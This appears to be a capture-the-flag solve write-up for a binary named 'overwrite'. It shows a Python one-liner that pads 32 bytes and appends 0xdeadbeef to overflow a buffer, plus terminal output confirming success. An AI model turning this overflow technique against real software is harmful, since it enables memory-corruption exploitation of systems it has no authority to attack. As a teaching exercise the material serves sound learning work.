### SOLVE
// Create payload
```shell
[padding + compare value]
python2 -c "print('A' * 32 + '\xef\xbe\xad\xde')" > payload
``` 

// Run payload
```shell
└─$ ./overwrite < payload                                      
yes? good job!!
deadbeef
```
// Other way to run payload
```shell
└─$ python2 -c "print('A' * 32 + '\xef\xbe\xad\xde')" | ./overwrite 
yes? good job!!
deadbeef
```